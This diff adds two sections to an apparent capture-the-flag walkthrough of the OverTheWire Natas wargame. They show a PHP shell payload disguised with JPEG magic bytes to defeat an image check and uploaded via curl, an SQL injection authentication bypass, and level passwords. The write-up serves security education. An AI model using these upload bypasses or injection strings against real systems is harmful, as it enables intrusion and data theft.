@@ -318,3 +318,52 @@ So the file successfully uploaded to the server with the `.php` extension as we 
 
 Password: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
 
+## Level 13 → 14
+Similar to the last level, we need to upload an image to the website. This time it says: ` For security reasons, we now only accept image files!`, and looking at the sourcecode we can see that it is done by using `exif_imagetype()`. This function is a built-in `PHP` function that checks the header of it's input file and returns if it is an image file (and what type) or not.
+```php
+<?php
+    print passthru("cat /etc/natas\_webpass/natas14");
+?>
+```
+We create the file `file.php` similar to the previous level, but this file's header is not an image type. We need to create a new file to trick `exif_imagetype()`.
+
+### File Signature
+A `file signature` (AKA `magic numbers`) is a sequence of 2-bytes in the beggining of file, the header. It is used to identify the file type, so the systems knows how to handle them and also extra guarentee that the file is actually the type it is declared. For example, `zip` files start with the sequence `'\x50\x4B\x03\x04'` and `JPEG` files start with `'\xFF\xD8\xFF\xE0'`. For more magic numbers, visit [list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).
+
+```bash
+(echo -ne '\xFF\xD8\xFF\xE0'; cat file.php) > image.php
+curl -X POST -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC natas13.natas.labs.overthewire.org/index.php -F"filename=image.php" -F "uploadedfile=@image.php"
+```
+By using this command we first put the `magic number` of a `JPEG` file inside our new file, and then put the rest of the malicious `PHP` code from `file.php` inside. `exif_imagetype()` checks for the file's signature, so by putting the signature of `JPEG` files we can trick it. Then we send our `POST` request, similar to previous level, and get this in the response:
+```html
+The file <a href="upload/al6r6jmwih.php">upload/al6r6jmwih.php</a> has been uploaded
+```
+And by checking the `/upload/al6r6jmwih.php` path we find the next password.
+
+Password: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
+
+# Level 14 → 15
+As we log in, the website asks for username and password (aside from the initial login to `Natas14`). Looking at the given sourcecode, we can see an `SQL query`.
+
+### SQL Injection
+`SQL Injection` is a type of security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It happens when user input is improperly filtered or escaped, allowing attackers to inject malicious SQL code. This can lead to unauthorized access to data, bypassing authentication, or even full control over the database. For example, if a web application directly includes user input in an `SQL` query without validation, an attacker might be able to manipulate the query to return all users’ data or delete tables.
+
+```php
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+...
+if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+    echo "Successful login! The password for natas15 is <censored><br>";
+```
+These parts of the code are important to us. First, we can see the query the server sends to the database, getting all of the users that have the input user and also the user password. Then, it checks if there's at least 1 `line` that was found in the query, and if there is, the login proccess is complete and the password is given. Therefore, if want to manipulate the query to have at least 1 line.
+
+This time it is a simple `SQL` injection. We insert the following input in the `username` field:
+```bash
+" or "1"="1" -- 
+```
+By submitting, the server gets our input and doesn't "sanitize" (check) it, so `$query` becomes this:
+```php
+$query = "SELECT * from users where username="" or "1"="1" -- " and password=\"".$_REQUEST["password"]."\"";
+```
+So, the query gets all the line where `username=""`, which is probably none, or `"1"="1"`, which is always true. Because it's a `or`, all lines return true to that condition and included in `$query`. Everything after the `--` is now a "comment" and doesnt matter. So all lines from `users` table get selected by `$query`, then we have at least one line and the login is successful.
+
+Password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
